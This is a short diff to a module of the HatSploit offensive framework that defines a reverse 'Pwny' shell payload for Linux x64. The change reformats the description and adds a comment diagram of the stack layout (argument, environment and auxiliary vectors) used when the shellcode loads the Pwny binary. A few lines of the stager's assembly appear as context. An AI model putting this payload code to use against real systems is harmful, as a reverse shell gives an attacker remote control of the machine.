@@ -22,10 +22,10 @@ class HatSploitPayload(Payload, Handler):
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
-            'Description': (
-                "This payload creates an interactive reverse Pwny shell for Linux "
-                "with x64 architecture."
-            ),
+            'Description': """
+                This payload creates an interactive reverse Pwny shell for Linux
+                with x64 architecture.
+            """,
             'Arch': ARCH_X64,
             'Platform': OS_LINUX,
             'Session': PwnySession,
@@ -58,6 +58,32 @@ class HatSploitPayload(Payload, Handler):
                 xor r9, r9
                 mov rax, 0x2d
                 syscall
+
+            #################################################
+            ##
+            ##    +----------------------------------+ low
+            ##    |              ARGC                |
+            ##    |----------------------------------|
+            ##    |           ARGV[0] = p            |
+            ##    |----------------------------------|
+            ##    |         ARGV[1] = sock           |
+            ##    |----------------------------------|
+            ##    |         NULL (ends ARGV)         |
+            ##    |----------------------------------|
+            ##    |          ENV strings             |
+            ##    |----------------------------------|
+            ##    |         NULL (ends ENV)          |
+            ##    |----------------------------------|
+            ##    |           AT_BASE (7)            |
+            ##    |----------------------------------|
+            ##    |   address of pwny binary image   |
+            ##    |----------------------------------|
+            ##    |           AT_NULL (0)            |
+            ##    |----------------------------------|
+            ##    |         NULL (ends AUXV)         |
+            ##    +----------------------------------+ high
+            ##
+            #################################################
 
                 and rsp, -0x10
                 add sp, 80
